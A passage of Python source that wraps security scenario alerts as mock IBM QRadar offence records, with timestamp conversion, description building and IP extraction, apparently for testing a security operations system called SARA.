        raw.get("timestamp")
        or (raw.get("timestamp_range", "") or "").split(" to ")[0]
        or "2026-05-22T00:00:00Z"
    )
    try:
        # Convert ISO to ms epoch
        from datetime import datetime
        dt = datetime.fromisoformat(ts_iso.replace("Z", "+00:00"))
        start_ms = int(dt.timestamp() * 1000)
    except Exception:
        start_ms = 1748000000000  # fallback ~ 2025-05-23

    # Build description: scenario tag + source + first impactful field
    summary_bits = [f"[{scenario_id} — {step_label}]", f"Source: {source}"]
    for k in ("alert", "detection", "anomaly", "risk_policy", "event_type"):
        v = raw.get(k)
        if isinstance(v, dict):
            for kk in ("name", "type", "description"):
                if v.get(kk):
                    summary_bits.append(str(v[kk])[:200])
                    break
            break
        elif isinstance(v, str) and v:
            summary_bits.append(v[:200])
            break
    description = " | ".join(summary_bits)[:1024]

    return {
        # Raw QRadar fields (script reads a['id'], a['start_time'], a['magnitude'])
        "id": offence_id,
        "offense_id": offence_id,
        "description": description,
        "offense_source": source,
        "source_ip": _extract_ip(raw),
        "destination_ip": "",
        "severity": sev_num,
        "magnitude": sev_num,
        "credibility": raw.get("confidence", 50) // 10 if isinstance(raw.get("confidence"), int) else 6,
        "relevance": 8,
        "status": "OPEN",
        "categories": raw.get("qradar_categories") or [scenario_id, "Sophisticated-Test"],
        "category_count": 2,
        "security_category_count": 2,
        "policy_category_count": 0,
        "rules": [{"type": "SARA_SCENARIO_TEST", "id": offence_id}],
        "start_time": start_ms,
        "start_epochtime": start_ms,
        "first_persisted_time": start_ms,
        "last_persisted_time": start_ms + 60000,
        "last_updated_time": start_ms + 30000,
        "event_count": 1,
        "flow_count": 0,
        "source_count": 1,
        "username_count": 1,
        "device_count": 1,
        "destination_port": "",
        "source_port": "",
        "log_sources": [{
            "type_name": "SARA-Scenario-Mock", "id": 999,
            "name": f"SARA Scenario {scenario_id} mock source",
            "type_id": 999,
        }],
        "remote_destination_count": 0,
        "local_destination_count": 1,
        "destination_networks": ["other"],
        "source_network": "Scenario-Mock-Net",
        "domain_id": 1,
        "domain_name": "CORPA",
        "assigned_to": None,
        "closing_user": None,
        "closing_reason_id": None,
        "close_time": None,
        "inactive": False,
        "protected": False,
        "follow_up": False,
        "offense_type": 0,
        "source_address_ids": [offence_id],
        "local_destination_address_ids": [],
        # Full raw alert preserved for SARA's downstream agents
        "_raw_alert": raw,
        "_scenario_id": scenario_id,
        "_scenario_step": step_label,
        "x-mock-source": MOCK_SOURCE,
    }


def _extract_ip(raw: dict) -> str:
    """Best-effort IP extraction from arbitrary alert shapes."""
    for path in (
        ("source_ip",),
        ("request", "source_ip"),
        ("device", "ip"),
        ("host", "ip"),
        ("transaction", "device"),
    ):
        cur: Any = raw
        try:
            for k in path:
                cur = cur[k]
            if isinstance(cur, str) and cur:
                return cur
        except (KeyError, TypeError):
            continue
    return ""


def all_scenarios_as_qradar() -> list[dict]:
    """Return all 12 scenario alerts wrapped as QRadar offences."""
    return [
        _wrap_as_qradar_offence(oid, sid, label, raw)
        for (oid, sid, label, raw) in SCENARIOS
    ]
